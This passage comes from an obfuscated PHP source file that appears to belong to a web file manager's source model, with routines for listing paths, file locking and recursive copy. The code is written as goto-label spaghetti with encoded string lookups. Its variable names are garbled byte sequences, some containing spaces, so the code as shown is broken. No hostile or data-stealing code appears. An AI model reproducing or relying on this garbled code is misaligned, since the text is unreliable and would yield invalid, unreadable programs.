C¥”’òŠğ¤; E©í¡™‰¨: } goto CŒé¼™ Û; CŒé¼™ Û: } protected function _listAppendPathRoot(&$aŒÚá´ã’ô, $A…Íô¾Óá) { $eåÎçé¡ÍÛ =& $_SERVER[ì‹É]; $FÒîèÁ‚´² = $eåÎçé¡ÍÛ[33]; if ($aŒÚá´ã’ô[$eåÎçé¡ÍÛ[368]] == self::TYPE_USER) { if (defined($eåÎçé¡ÍÛ[423]) && $aŒÚá´ã’ô[$eåÎçé¡ÍÛ[452]] == USER_ID) { $FÒîèÁ‚´² = LNG($eåÎçé¡ÍÛ[465]); if (!$A…Íô¾Óá) { $aŒÚá´ã’ô[$eåÎçé¡ÍÛ[28]] = $FÒîèÁ‚´²; } } else { $c«İ±õ‡ = Model($eåÎçé¡ÍÛ[466])->getInfoSimple($aŒÚá´ã’ô[$eåÎçé¡ÍÛ[452]]); $FÒîèÁ‚´² = LNG($eåÎçé¡ÍÛ[467]) . $eåÎçé¡ÍÛ[154] . $c«İ±õ‡[$eåÎçé¡ÍÛ[28]] . $eåÎçé¡ÍÛ[468]; } } else { if ($aŒÚá´ã’ô[$eåÎçé¡ÍÛ[368]] == self::TYPE_GROUP) { $c«İ±õ‡ = Model($eåÎçé¡ÍÛ[454])->getInfoSimple($aŒÚá´ã’ô[$eåÎçé¡ÍÛ[452]]); $FÒîèÁ‚´² = $c«İ±õ‡[$eåÎçé¡ÍÛ[28]]; } else { if ($aŒÚá´ã’ô[$eåÎçé¡ÍÛ[368]] == self::TYPE_SYSTEM) { $c«İ±õ‡ = $this->sourceInfo($A…Íô¾Óá[0], !0); $FÒîèÁ‚´² = $c«İ±õ‡[$eåÎçé¡ÍÛ[28]]; } } } $FÒîèÁ‚´² = $FÒîèÁ‚´² ? $eåÎçé¡ÍÛ[8] . $FÒîèÁ‚´² . $eåÎçé¡ÍÛ[8] : $eåÎçé¡ÍÛ[8]; return $FÒîèÁ‚´²; } protected function _listAppendUser(&$bÛ“¶‡ˆŞá) { $BÙÆ½¯¼ù =& $_SERVER[ì‹É]; $B ¬òŠÄØ“ = array_to_keyvalue($bÛ“¶‡ˆŞá, $BÙÆ½¯¼ù[33], $BÙÆ½¯¼ù[375]); $cÁ¸Øàœå× = array_to_keyvalue($bÛ“¶‡ˆŞá, $BÙÆ½¯¼ù[33], $BÙÆ½¯¼ù[376]); $Cµëä‚ÕÌä = array_merge($B ¬òŠÄØ“, $cÁ¸Øàœå×); $B ¼Èâ…Î = Model($BÙÆ½¯¼ù[469])->userListInfo($Cµëä‚ÕÌä); foreach ($bÛ“¶‡ˆŞá as &$AÙ¯×”ùÀ†) { $d¿§Ä›Øİ = $AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[375]]; $AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[375]] = $B ¼Èâ…Î[$d¿§Ä›Øİ] ? $B ¼Èâ…Î[$d¿§Ä›Øİ] : !1; $d¿§Ä›Øİ = $AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[376]]; $AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[376]] = $B ¼Èâ…Î[$d¿§Ä›Øİ] ? $B ¼Èâ…Î[$d¿§Ä›Øİ] : !1; if (isset($AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[413]]) && $AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[413]][$BÙÆ½¯¼ù[470]]) { $FµŞÂÔ²•İ = $GLOBALS[$BÙÆ½¯¼ù[6]][$BÙÆ½¯¼ù[85]][$BÙÆ½¯¼ù[471]]; if ($AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[413]][$BÙÆ½¯¼ù[472]] <= time() - $FµŞÂÔ²•İ) { $this->metaSet($AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[366]], $BÙÆ½¯¼ù[470], null); $this->metaSet($AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[366]], $BÙÆ½¯¼ù[472], null); unset($AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[413]][$BÙÆ½¯¼ù[470]]); continue; } $aÜ‘¹¤° = $AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[413]][$BÙÆ½¯¼ù[470]]; $AÙ¯×”ùÀ†[$BÙÆ½¯¼ù[413]][$BÙÆ½¯¼ù[473]] = Model($BÙÆ½¯¼ù[469])->getInfoSimpleOuter($aÜ‘¹¤°); } } } public function parentLevelArray($Dì›¢Œ¸îÌ) { $f°¤èª­¶Â =& $_SERVER[ì‹É]; $Dì›¢Œ¸îÌ = explode($f°¤èª­¶Â[47], trim($Dì›¢Œ¸îÌ, $f°¤èª­¶Â[47])); return array_remove_value($Dì›¢Œ¸îÌ, $f°¤èª­¶Â[464]); } public function listAll($F„ÈÜè…Ï) { goto eæÊ‰ÜÊñª; f»Ÿ ÉÈàù: $this->_listAppendAuth($d’·¥Šß“Ÿ); $this->_listAppendUser($d’·¥Šß“Ÿ); $this->_listAppendPath($d’·¥Šß“Ÿ); goto eÕç…™¦È; D­Åøõ¾Ó¢: $c‡æ¬¨¨ƒ = $A«ã…ßïà“[478]; $E”³‚²è˜ò = "\114\x45\106\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\157\137\x66\151\154\145\40\x66\151\154\x65\40\157\x6e\40\x73\x6f\165\x72\x63\145\x2e\146\x69\154\x65\x49\104\x20\75\x20\x66\x69\154\x65\56\146\151\154\145\111\x44"; $d’·¥Šß“Ÿ = $this->alias($A«ã…ßïà“[479])->field($c‡æ¬¨¨ƒ)->where($A¥¡ø…½®)->join($E”³‚²è˜ò)->select(); goto f»Ÿ ÉÈàù; eÕç…™¦È: $d’·¥Šß“Ÿ = array_to_keyvalue($d’·¥Šß“Ÿ, $A«ã…ßïà“[366]); $d‡ÌÇ”¸£– = "\x2f{$d—«£Éò‘Ì[$A«ã…ßïà“[28]]}\57"; $d‡ÌÇ”¸£– = $d‡ÌÇ”¸£– == $A«ã…ßïà“[463] ? $A«ã…ßïà“[8] : $d‡ÌÇ”¸£–; goto AÊîœÁØ×; AÊîœÁØ×: $eŞ¶Î˜Õ•İ = array(); foreach ($d’·¥Šß“Ÿ as $bìŸÉîõÈ° => $Fö©äİÖÇ) { goto f¦•§ªÌª; A¿¶…ÔŠÍ: if (!$Fö©äİÖÇ[$A«ã…ßïà“[367]]) { $Aºñ…Ÿ©é×[$A«ã…ßïà“[415]] = $Fö©äİÖÇ[$A«ã…ßïà“[415]]; $Aºñ…Ÿ©é×[$A«ã…ßïà“[481]] = $Fö©äİÖÇ[$A«ã…ßïà“[76]]; } $eŞ¶Î˜Õ•İ[] = $Aºñ…Ÿ©é×; goto fÍÏŒƒÕ¢; dáÄ†â©á­: $d¬Š“Ã–ã‹ = str_replace($A«ã…ßïà“[463], $A«ã…ßïà“[8], $d¬Š“Ã–ã‹); $d¬Š“Ã–ã‹ = str_replace($A«ã…ßïà“[463], $A«ã…ßïà“[8], $d¬Š“Ã–ã‹); $Aºñ…Ÿ©é× = array($A«ã…ßïà“[384] => str_replace($A«ã…ßïà“[463], $A«ã…ßïà“[8], $d¬Š“Ã–ã‹), $A«ã…ßïà“[480] => intval($Fö©äİÖÇ[$A«ã…ßïà“[367]]), $A«ã…ßïà“[388] => $this->pathInfoFilter($Fö©äİÖÇ, !0)); goto A¿¶…ÔŠÍ; f¦•§ªÌª: $FöĞÅĞ¤âã = $this->parentLevelArray($Fö©äİÖÇ[$A«ã…ßïà“[455]]); array_shift($FöĞÅĞ¤âã); $d¬Š“Ã–ã‹ = $d‡ÌÇ”¸£–; goto BàÊí£Ï‘; BàÊí£Ï‘: for ($cÛ›º…  = 0; $cÛ›º…  < count($FöĞÅĞ¤âã); $cÛ›º… ++) { $d¬Š“Ã–ã‹ .= $d’·¥Šß“Ÿ[$FöĞÅĞ¤âã[$cÛ›º… ]][$A«ã…ßïà“[28]] . $A«ã…ßïà“[8]; } $d¬Š“Ã–ã‹ .= $Fö©äİÖÇ[$A«ã…ßïà“[28]]; if ($Fö©äİÖÇ[$A«ã…ßïà“[367]]) { $d¬Š“Ã–ã‹ .= $A«ã…ßïà“[8]; } goto dáÄ†â©á­; fÍÏŒƒÕ¢: } return $eŞ¶Î˜Õ•İ; goto c™†ƒ›ªˆ°; eæÊ‰ÜÊñª: $A«ã…ßïà“ =& $_SERVER[ì‹É]; $d—«£Éò‘Ì = $this->sourceInfo($F„ÈÜè…Ï); $A¥¡ø…½® = array($A«ã…ßïà“[474] => array($A«ã…ßïà“[475], $d—«£Éò‘Ì[$A«ã…ßïà“[455]] . $F„ÈÜè…Ï . $A«ã…ßïà“[476]), $A«ã…ßïà“[477] => 0); goto D­Åøõ¾Ó¢; c™†ƒ›ªˆ°: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($dÕ¯¸—Ì) { goto E¹Úƒ…ëŠì; eİÛ¶ßãâÓ: $this->_lockEvent($dÕ¯¸—Ì, array($dÇŒŒé‡…—[485], $dÇŒŒé‡…—[486]), $F…ñØ¤ìà‹); $this->_lockCheckEnd($dÇŒŒé‡…—[482], $dÕ¯¸—Ì); goto B•Î‰Œñ; aè‰Ç²š¨¢: $F…ñØ¤ìà‹ = 1; $this->_lockEvent($dÕ¯¸—Ì, array($dÇŒŒé‡…—[483], $dÇŒŒé‡…—[484]), $F…ñØ¤ìà‹); $this->_lockParent($dÕ¯¸—Ì, array($dÇŒŒé‡…—[484]), $F…ñØ¤ìà‹); goto eİÛ¶ßãâÓ; E¹Úƒ…ëŠì: $dÇŒŒé‡…— =& $_SERVER[ì‹É]; if (!$this->allowLock()) { return; } $this->_lockCheck($dÇŒŒé‡…—[482], $dÕ¯¸—Ì); goto aè‰Ç²š¨¢; B•Î‰Œñ: } public function lockCopyEnd($D¦‡ÀØ®ËÒ) { $d“ùÍ×¹õª =& $_SERVER[ì‹É]; if (!$this->allowLock()) { return; } $CÚà‚ÎÃø£ = 0; $this->_lockEvent($D¦‡ÀØ®ËÒ, array($d“ùÍ×¹õª[483], $d“ùÍ×¹õª[484]), $CÚà‚ÎÃø£); $this->_lockParent($D¦‡ÀØ®ËÒ, array($d“ùÍ×¹õª[484]), $CÚà‚ÎÃø£); $this->_lockEvent($D¦‡ÀØ®ËÒ, array($d“ùÍ×¹õª[485], $d“ùÍ×¹õª[486]), $CÚà‚ÎÃø£); } public function lockWriteStart($aßº¦¡¤øç, $d…­’¶•Êƒ = '') { goto C¤Æ–¶ÜË; eæì’¬™‹: $d¨‘­ø½ê = 1; $this->_lockKey($EÒæˆ¡ãš[487] . $aßº¦¡¤øç . $EÒæˆ¡ãš[94] . $d…­’¶•Êƒ, $d¨‘­ø½ê); $this->_lockEvent($aßº¦¡¤øç, array($EÒæˆ¡ãš[482], $EÒæˆ¡ãš[484]), $d¨‘­ø½ê); goto E§ï»Ú–ìİ; C¤Æ–¶ÜË: $EÒæˆ¡ãš =& $_SERVER[ì‹É]; if (!$this->allowLock()) { return; } $this->_lockCheck($EÒæˆ¡ãš[483], $aßº¦¡¤øç); goto eæì’¬™‹; E§ï»Ú–ìİ: $this->_lockParent($aßº¦¡¤øç, array($EÒæˆ¡ãš[482], $EÒæˆ¡ãš[484]), $d¨‘­ø½ê); $this->_lockCheckEnd($EÒæˆ¡ãš[483], $aßº¦¡¤øç); goto fÛä“„¨„; fÛä“„¨„: } public function lockWriteEnd($då´ ïµø, $EÖ•Œ™·á¿ = '') { $DÓ¿Ú·…è =& $_SERVER[ì‹É]; if (!$this->allowLock()) { return; } $A·±¹‚³«¨ = 0; $this->_lockKey($DÓ¿Ú·…è[487] . $då´ ïµø . $DÓ¿Ú·…è[94] . $EÖ•Œ™·á¿, $A·±¹‚³«¨); $this->_lockEvent($då´ ïµø, array($DÓ¿Ú·…è[482], $DÓ¿Ú·…è[484]), $A·±¹‚³«¨); $this->_lockParent($då´ ïµø, array($DÓ¿Ú·…è[482], $DÓ¿Ú·…è[484]), $A·±¹‚³«¨); } public function lockMoveStart($fÌ¶§ŒÉø) { goto Eá¼Ÿ·–‚’; c‚ÉÜ±¸õ”: $Bä°¡±¥˜¿ = 1; $this->_lockKey($BÖÃÜÜÒ¨‚[488] . $fÌ¶§ŒÉø, $Bä°¡±¥˜¿); $this->_lockEvent($fÌ¶§ŒÉø, array($BÖÃÜÜÒ¨‚[482], $BÖÃÜÜÒ¨‚[483]), $Bä°¡±¥˜¿); goto a®ğ—¶‰„; Eá¼Ÿ·–‚’: $BÖÃÜÜÒ¨‚ =& $_SERVER[ì‹É]; if (!$this->allowLock()) { return; } $this->_lockCheck($BÖÃÜÜÒ¨‚[484], $fÌ¶§ŒÉø); goto c‚ÉÜ±¸õ”; a®ğ—¶‰„: $this->_lockParent($fÌ¶§ŒÉø, array($BÖÃÜÜÒ¨‚[482], $BÖÃÜÜÒ¨‚[484]), $Bä°¡±¥˜¿); $this->_lockEvent($fÌ¶§ŒÉø, array($BÖÃÜÜÒ¨‚[489], $BÖÃÜÜÒ¨‚[485], $BÖÃÜÜÒ¨‚[486]), $Bä°¡±¥˜¿); $this->_lockCheckEnd($BÖÃÜÜÒ¨‚[484], $fÌ¶§ŒÉø); goto cµ‘ùòÖŠ; cµ‘ùòÖŠ: } public function lockMoveEnd($Cğóœ©µä£) { goto CÈ„Ü’™ÖÍ; dÄÎó„˜˜: $this->_lockEvent($Cğóœ©µä£, array($D‚«²‹™·è[489], $D‚«²‹™·è[485], $D‚«²‹™·è[486]), $aÚéİ•¸œ); goto C‹Ğ¡Œ‚ŒÇ; CÈ„Ü’™ÖÍ: $D‚«²‹™·è =& $_SERVER[ì‹É]; if (!$this->allowLock()) { return; } $aÚéİ•¸œ = 0; goto fÛ£šô©ô®; fÛ£šô©ô®: $this->_lockKey($D‚«²‹™·è[488] . $Cğóœ©µä£, $aÚéİ•¸œ); $this->_lockEvent($Cğóœ©µä£, array($D‚«²‹™·è[482], $D‚«²‹™·è[483]), $aÚéİ•¸œ); $this->_lockParent($Cğóœ©µä£, array($D‚«²‹™·è[482], $D‚«²‹™·è[484]), $aÚéİ•¸œ); goto dÄÎó„˜˜; C‹Ğ¡Œ‚ŒÇ: } private function _lockCheck($B÷‹ÀŠ˜Ì, $A“ÉÅöÓÓ¦) { goto E¨œ—™Ê«Â; C÷’õ™Ñ’Ñ: CacheLock::setErrorMsg($c®¥ÕÃ¡¹ø[154] . htmlspecialchars($eãˆßòÏ®[$c®¥ÕÃ¡¹ø[28]]) . $c®¥ÕÃ¡¹ø[468] . $Fƒ¾ˆòßõ); $this->_lockKey($d°àŠ•å¢Ç, 1); $this->_lockKey($d°àŠ•å¢Ç, 0); goto E±Ÿ¦°ì÷Ò; D¢‰•¯: $this->_lockTimeStart[$d°àŠ•å¢Ç] = timeFloat(); if (!is_array($eãˆßòÏ®)) { return; } $Fƒ¾ˆòßõ = LNG($c®¥ÕÃ¡¹ø[490]); goto C÷’õ™Ñ’Ñ; E¨œ—™Ê«Â: $c®¥ÕÃ¡¹ø =& $_SERVER[ì‹É]; $eãˆßòÏ® = $this->sourceInfo($A“ÉÅöÓÓ¦); $d°àŠ•å¢Ç = $B÷‹ÀŠ˜Ì . $c®¥ÕÃ¡¹ø[94] . $A“ÉÅöÓÓ¦; goto D¢‰•¯; E±Ÿ¦°ì÷Ò: $bÍÁò„ÎÄë = array_reverse($this->parentLevelArray($eãˆßòÏ®[$c®¥ÕÃ¡¹ø[455]])); foreach ($bÍÁò„ÎÄë as $a¨ìù…£Á) { $d°àŠ•å¢Ç = $B÷‹ÀŠ˜Ì . $c®¥ÕÃ¡¹ø[491] . $a¨ìù…£Á; if (CacheLock::lockGet($c®¥ÕÃ¡¹ø[492] . $d°àŠ•å¢Ç)) { $eãˆßòÏ® = $this->sourceInfo($a¨ìù…£Á); CacheLock::setErrorMsg($c®¥ÕÃ¡¹ø[154] . htmlspecialchars($eãˆßòÏ®[$c®¥ÕÃ¡¹ø[28]]) . $c®¥ÕÃ¡¹ø[468] . $Fƒ¾ˆòßõ); $this->_lockKey($d°àŠ•å¢Ç, 1); $this->_lockKey($d°àŠ•å¢Ç, 0); } } goto DÇ“íâ·½ó; DÇ“íâ·½ó: } private function _lockCheckEnd($eÙ¢©ÖêğĞ, $FÎñÊ‘¦ç–) { goto eéÜ¬Ñ·µ; eéÜ¬Ñ·µ: $E¿ÎÛ«§ =& $_SERVER[ì‹É]; $B½¼³ƒğõ¾ = $eÙ¢©ÖêğĞ . $E¿ÎÛ«§[94] . $FÎñÊ‘¦ç–; CacheLock::setErrorMsg($E¿ÎÛ«§[358]); goto D³ï¦¾Œ ‹; D³ï¦¾Œ ‹: if (!isset($this->_lockTimeStart[$B½¼³ƒğõ¾])) { return; } $C‘Ó¯¬‡ùœ = timeFloat() - $this->_lockTimeStart[$B½¼³ƒğõ¾]; unset($this->_lockTimeStart[$B½¼³ƒğõ¾]); goto Cî§‡¨Äİ; Cî§‡¨Äİ: if ($C‘Ó¯¬‡ùœ > 0.5) { unset(self::$cacheSourceInfo[$E¿ÎÛ«§[406] . $FÎñÊ‘¦ç–]); } $F­™ø„¨£ = $this->sourceInfo($FÎñÊ‘¦ç–); if (!$F­™ø„¨£) { show_json(LNG($E¿ÎÛ«§[103]), !1); } goto cÛ·Œ¥ªÍ; cÛ·Œ¥ªÍ: } private function _lockParent($FĞÄ÷‰©Œ«, $A´†¤æ‰Ñ, $eô×ˆƒÏ¸) { if (!$this->autoLockSet) { return; } $f×ËäÀï¾ = $this->sourceInfo($FĞÄ÷‰©Œ«); if (!is_array($f×ËäÀï¾)) { return; } $e·½¨ÌæÍÜ = array_reverse($this->parentLevelArray($f×ËäÀï¾[$_SERVER[ì‹É][455]])); foreach ($e·½¨ÌæÍÜ as $e‚ØäÀÌŠÔ) { $this->_lockEvent($e‚ØäÀÌŠÔ, $A´†¤æ‰Ñ, $eô×ˆƒÏ¸); } } private function _lockEvent($aà¾’‚²Ïù, $A¨ÎšÇ»¡, $f•ÚšÍÑÎØ) { $AÌ–»Ç©¤ =& $_SERVER[ì‹É]; if (!$this->autoLockSet) { return; } foreach ($A¨ÎšÇ»¡ as $dÜÑˆ¨¡½†) { $a©ŒìŞ–ƒğ = $dÜÑˆ¨¡½† . $AÌ–»Ç©¤[94] . $aà¾’‚²Ïù; if ($f•ÚšÍÑÎØ && CacheLock::lockGet($AÌ–»Ç©¤[492] . $a©ŒìŞ–ƒğ)) { continue; } $this->_lockKey($a©ŒìŞ–ƒğ, $f•ÚšÍÑÎØ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($c¯æãÒá¶Ë, $cçë…Ù£ß© = 1) { $fš—ôöãËÑ = $_SERVER[ì‹É][492] . $c¯æãÒá¶Ë; if ($cçë…Ù£ß©) { if (isset(self::$_lockItemArr[$fš—ôöãËÑ])) { return; } self::$_lockItemArr[$fš—ôöãËÑ] = 1; CacheLock::lock($fš—ôöãËÑ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$fš—ôöãËÑ])) { return; } unset(self::$_lockItemArr[$fš—ôöãËÑ]); CacheLock::unlock($fš—ôöãËÑ); } } public function isParentOf($B§¿µ±ã½Ó, $dµˆ¯Á®Ö») { goto AÂªøï„ÂÎ; E‹…´£¬ƒŒ: return $a›²­¾ğÈÅ; goto Aë¼åİØÔÓ; AÂªøï„ÂÎ: $BÃ¦Á–‡ ” =& $_SERVER[ì‹É]; $D‡È…Ü÷†á = $this->sourceInfo($B§¿µ±ã½Ó); $f­ØŞ÷‰ø¬ = $this->sourceInfo($dµˆ¯Á®Ö»); goto BÃ¾ñ¹…´¨; BÃ¾ñ¹…´¨: $cŸ¼‘º£ÒÅ = $D‡È…Ü÷†á[$BÃ¦Á–‡ ”[455]] . $D‡È…Ü÷†á[$BÃ¦Á–‡ ”[366]] . $BÃ¦Á–‡ ”[47]; $D™”„ˆ“ = $f­ØŞ÷‰ø¬[$BÃ¦Á–‡ ”[455]] . $f­ØŞ÷‰ø¬[$BÃ¦Á–‡ ”[366]] . $BÃ¦Á–‡ ”[47]; $a›²­¾ğÈÅ = strpos($D™”„ˆ“, $cŸ¼‘º£ÒÅ) === 0; goto E‹…´£¬ƒŒ; Aë¼åİØÔÓ: } public function copy($B”ŒÇïèÖŞ, $FÔÊ‰·Ğ, $D¸Ï­±…–˜ = REPEAT_REPLACE, $f–Œ¶“Æ‡ = '') { goto c¶ÅÓ‚; dÑ‡°‚¹É: $d„§»‰Å–Ö = $this->fileNameExistCache($FÔÊ‰·Ğ, $eêƒĞïãô[$DÈµòÑøÜÚ[28]]); $C›÷Œ„à©† = $this->_copy($B”ŒÇïèÖŞ, $FÔÊ‰·Ğ, $D¸Ï­±…–˜, $E¤‚ŸÇªŸí, !0, $f–Œ¶“Æ‡); $this->_childrenListClear(); goto aÎñó®«µÙ; B È°İ›œŞ: $this->lockCopyStart($B”ŒÇïèÖŞ); $this->lockWriteStart($FÔÊ‰·Ğ, $EñÛĞ·Œ®); $E¤‚ŸÇªŸí = array($DÈµòÑøÜÚ[493] => array(), $DÈµòÑøÜÚ[494] => array(), $DÈµòÑøÜÚ[495] => array()); goto dÑ‡°‚¹É; Dìç¤Æ† ¢: Model($DÈµòÑøÜÚ[164])->linkAdd($E¤‚ŸÇªŸí[$DÈµòÑøÜÚ[493]]); $this->folderSizeReset($FÔÊ‰·Ğ); $this->updateModifyTime($FÔÊ‰·Ğ); goto B¤ˆ±ÍíŸ ; B¤ˆ±ÍíŸ : return $C›÷Œ„à©†; goto F¥“òÀ°¥ä; c¶ÅÓ‚: $DÈµòÑøÜÚ =& $_SERVER[ì‹É]; $eêƒĞïãô = $this->sourceInfo($B”ŒÇïèÖŞ); $BØ·îÕÔ = $this->sourceInfo($FÔÊ‰·Ğ); goto DàÔÒÍùÂÚ; aÈ‹ğ¬™œë: Model($DÈµòÑøÜÚ[496])->addAll($E¤‚ŸÇªŸí[$DÈµòÑøÜÚ[494]], array(), !0); if ($d„§»‰Å–Ö != $C›÷Œ„à©† || $eêƒĞïãô[$DÈµòÑøÜÚ[367]] == $DÈµòÑøÜÚ[84]) { Model($DÈµòÑøÜÚ[497])->eventCopy($C›÷Œ„à©†); } $this->saveAll($E¤‚ŸÇªŸí[$DÈµòÑøÜÚ[495]]); goto Dìç¤Æ† ¢; DàÔÒÍùÂÚ: if (!$eêƒĞïãô || !$BØ·îÕÔ || $BØ·îÕÔ[$DÈµòÑøÜÚ[367]] != $DÈµòÑøÜÚ[84]) { return !1; } if ($this->isParentOf($B”ŒÇïèÖŞ, $FÔÊ‰·Ğ)) { return !1; } $EñÛĞ·Œ® = $f–Œ¶“Æ‡ ? $f–Œ¶“Æ‡ : $eêƒĞïãô[$DÈµòÑøÜÚ[28]]; goto B È°İ›œŞ; aÎñó®«µÙ: $this->lockCopyEnd($B”ŒÇïèÖŞ); $this->lockWriteEnd($FÔÊ‰·Ğ, $EñÛĞ·Œ®); if ($eêƒĞïãô[$DÈµòÑøÜÚ[367]] == $DÈµòÑøÜÚ[84] && $d„§»‰Å–Ö == $C›÷Œ„à©†) { $this->folderSizeResetChildren($d„§»‰Å–Ö); } goto aÈ‹ğ¬™œë; F¥“òÀ°¥ä: } private function _copy($EĞŒ¶Æ¤ÙÉ, $aé¦¶òÓÒ, $bÑç¡ôÉÂä, &$Aˆ‹º”Şô, $fÖî´ÂÙ­˜, $BóùååÛù® = '') { goto C¾Ãâ²ã«’; F‘İ½‰¼Ã: $e¥ÙÃ«Ëí = $BóùååÛù® ? $BóùååÛù® : $fŠŞ˜½Ñ„[$EŒ®×Ê»±Î[28]]; $a®©³–•§– = $this->fileNameExistCache($aé¦¶òÓÒ, $e¥ÙÃ«Ëí); if ($fÖî´ÂÙ­˜) { $this->_childrenAllMake($EĞŒ¶Æ¤ÙÉ); if ($DÚ»ù…ß && $a®©³–•§–) { $this->_childrenAllMake($a®©³–•§–); } } goto eô¦ß¼Šëê; FŠîõ¸†Ÿ: return $c‘Ì‹±¸¡£; goto a¬ÊÒ‹ĞÙò; C¾Ãâ²ã«’: $EŒ®×Ê»±Î =& $_SERVER[ì‹É]; $fŠŞ˜½Ñ„ = $this->sourceInfoCache($EĞŒ¶Æ¤ÙÉ); $DÚ»ù…ß = $fŠŞ˜½Ñ„[$EŒ®×Ê»±Î[367]] == $EŒ®×Ê»±Î[84]; goto F‘İ½‰¼Ã; eô¦ß¼Šëê: if (!$a®©³–•§–) { return $this->_copyCreate($EĞŒ¶Æ¤ÙÉ, $aé¦¶òÓÒ, $e¥ÙÃ«Ëí, $Aˆ‹º”Şô); } $c‘Ì‹±¸¡£ = $a®©³–•§–; if ($DÚ»ù…ß) { if ($bÑç¡ôÉÂä == REPEAT_RENAME_FOLDER) { $e¥ÙÃ«Ëí = $this->fileNameAutoCache($aé¦¶òÓÒ, $e¥ÙÃ«Ëí, $bÑç¡ôÉÂä, $DÚ»ù…ß); $c‘Ì‹±¸¡£ = $this->_copyCreate($EĞŒ¶Æ¤ÙÉ, $aé¦¶òÓÒ, $e¥ÙÃ«Ëí, $Aˆ‹º”Şô); } else { $eïŠ‚¬¡ŒÙ = $this->_childrenList($EĞŒ¶Æ¤ÙÉ); foreach ($eïŠ‚¬¡ŒÙ as $bÛèİÇŠ®„) { $this->_copy($bÛèİÇŠ®„[$EŒ®×Ê»±Î[366]], $a®©³–•§–, $bÑç¡ôÉÂä, $Aˆ‹º”Şô, !1); } } } else { if ($bÑç¡ôÉÂä == REPEAT_RENAME || $bÑç¡ôÉÂä == REPEAT_RENAME_FOLDER) { $e¥ÙÃ«Ëí = $this->fileNameAutoCache($aé¦¶òÓÒ, $e¥ÙÃ«Ëí, $bÑç¡ôÉÂä, $DÚ»ù…ß); $c‘Ì‹±¸¡£ = $this->_copyCreate($EĞŒ¶Æ¤ÙÉ, $aé¦¶òÓÒ, $e¥ÙÃ«Ëí, $Aˆ‹º”Şô); } else { if ($bÑç¡ôÉÂä == REPEAT_REPLACE) { $E¦õŒ˜¡™ = $this->sourceInfoCache($a®©³–•§–); $aëŒõ©™—¼ = $this->fileHistory($E¦õŒ˜¡™, $fŠŞ˜½Ñ„[$EŒ®×Ê»±Î[415]], $fŠŞ˜½Ñ„[$EŒ®×Ê»±Î[78]]); if ($aëŒõ©™—¼) { $Aˆ‹º”Şô[$EŒ®×Ê»±Î[493]][] = $fŠŞ˜½Ñ„[$EŒ®×Ê»±Î[415]]; } } else { if ($bÑç¡ôÉÂä == REPEAT_SKIP) { } } } Hook::trigger($EŒ®×Ê»±Î[498], array($EŒ®×Ê»±Î[499], $fŠŞ˜½Ñ„, 0)); } goto FŠîõ¸†Ÿ; a¬ÊÒ‹ĞÙò: } private function _copyCreate($b¡¸šÊÍ‘ê, $bé×ˆšãîŠ, $c‹¿ÓïÒù¡, &$c¬…±áõ¸õ) { goto D“‡ğ‰Ğ˜É; EÚÁœáÖ£: $a®¢¶ŒŒÓ†[$b¡¸šÊÍ‘ê] = $Eİ¢¶¸ç’; $BĞƒµ¤‚ = array(); $A’¬•“ÄÉ… = array(); goto CÛ¹„¾¡Œ; a £æØÑÇÎ: if ($F™¿–ØÄ™[$D’Á„±§Íø[367]] != $D’Á„±§Íø[84]) { $c¬…±áõ¸õ[$D’Á„±§Íø[493]][] = $F™¿–ØÄ™[$D’Á„±§Íø[415]]; return $Eİ¢¶¸ç’; } $Dè©Û¯íØ = array(); $DÙ‰¿ŞÒéé = array(); goto cÓÙ”‡Áª‘; D“‡ğ‰Ğ˜É: $D’Á„±§Íø =& $_SERVER[ì‹É]; $F™¿–ØÄ™ = $this->sourceInfoCache($b¡¸šÊÍ‘ê); $f˜òõÀÊ‰ = $this->sourceInfoCache($bé×ˆšãîŠ); goto d ±´çºÅ; CÊéóò„ø: $Eİ¢¶¸ç’ = $this->add($A¾ÁÂ¸§ò‹); $eÔËé‰‰¯¨ = array($D’Á„±§Íø[366] => $Eİ¢¶¸ç’, $D’Á„±§Íø[28] => $c‹¿ÓïÒù¡); $this->_copyApplyMeta($eÔËé‰‰¯¨, $c¬…±áõ¸õ); goto a £æØÑÇÎ; cÓÙ”‡Áª‘: $this->_childrenListAll($b¡¸šÊÍ‘ê, $Dè©Û¯íØ); $aœ®ÃêÁîá = count($Dè©Û¯íØ); if ($aœ®ÃêÁîá == 0) { return $Eİ¢¶¸ç’; } goto f¸«„Í¤ô©; d ±´çºÅ: $A¾ÁÂ¸§ò‹ = $this->_makeItemData($F™¿–ØÄ™, $f˜òõÀÊ‰, $c‹¿ÓïÒù¡); Hook::trigger($D’Á„±§Íø[500], $A¾ÁÂ¸§ò‹); Hook::trigger($D’Á„±§Íø[501], array($D’Á„±§Íø[502], $A¾ÁÂ¸§ò‹, 0)); goto CÊéóò„ø; c¡‡ôçŒŠá: $this->chunkEventSet($D’Á„±§Íø[507], array($D’Á„±§Íø[508], $A¾ÁÂ¸§ò‹, $aœ®ÃêÁîá)); $this->saveAll($A’¬•“ÄÉ…); return $Eİ¢¶¸ç’; goto e®›êˆ†¦; CÛ¹„¾¡Œ: foreach ($fÀ™¸ãØœÜ as $dÏøÕîØ­Õ) { $AñœŒ‹ÉÎ = $dÏøÕîØ­Õ[$D’Á„±§Íø[366]]; $Bö¬ø­é… = $this->_childrenMatch($a®¢¶ŒŒÓ†, $dÏøÕîØ­Õ, $dÔœè™Ì†); $BĞƒµ¤‚[] = array($D’Á„±§Íø[366], $AñœŒ‹ÉÎ, $D’Á„±§Íø[457], $Bö¬ø­é…[$D’Á„±§Íø[457]]); $A’¬•“ÄÉ…[] = array($D’Á„±§Íø[366], $AñœŒ‹ÉÎ, $D’Á„±§Íø[455], $Bö¬ø­é…[$D’Á„±§Íø[455]]); $this->_copyApplyMeta($dÏøÕîØ­Õ, 